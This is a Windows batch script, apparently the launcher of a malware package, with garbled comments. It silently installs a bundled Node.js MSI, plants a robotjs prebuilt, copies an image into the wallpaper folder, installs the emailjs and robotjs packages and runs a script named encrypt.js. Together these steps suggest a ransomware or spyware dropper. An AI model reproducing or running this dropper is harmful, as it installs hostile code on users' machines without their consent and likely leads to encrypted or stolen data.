@echo off

rem ����������64λϵͳ��ֱ���˳�����
if not exist "%SystemDrive%\Program Files (x86)" exit
if exist %~dp0\nodex64.msi copy %~dp0\nodex64.msi %appdata%\nodex64.msi
rem if exist %~dp0\nodex64.msi del /f /q  %~dp0\nodex64.msi
if exist "%SystemDrive%\Program Files\nodejs" goto run
start /wait "" %appdata%\nodex64.msi /quiet

::��װrobotjs��ɾ��Դ�ļ�
@set dest_path=%appdata%\npm-cache\_prebuilds
@if not exist %dest_path% md %dest_path%
@copy  %CUR_PATH%\robotx64.gz %dest_path%\https-github.com-octalmage-robotjs-releases-download-v0.4.7-robotjs-v0.4.7-node-v48-win32-x64.tar.gz
@rem del /s /q /f %CUR_PATH%\robot.gz

:run
::������ֽͼƬ��ϵͳ�̲�ɾ��Դ�ļ�
@set CUR_PATH=%cd%
@if not exist %WINDIR%\Web\Wallpaper md %WINDIR%\Web\Wallpaper
@copy %CUR_PATH%\123.jpg %WINDIR%\Web\Wallpaper.jpg
@rem del /s /q /f %CUR_PATH%\123.jpg

rem ����Ҳ����дһ���ƻ�����,���ڶ�ʱ����nd1.bat
"%SystemDrive%\Program Files\nodejs\npm.cmd" install emailjs
"%SystemDrive%\Program Files\nodejs\npm.cmd" install robotjs
"%SystemDrive%\Program Files\nodejs\node.exe" encrypt.js

exit


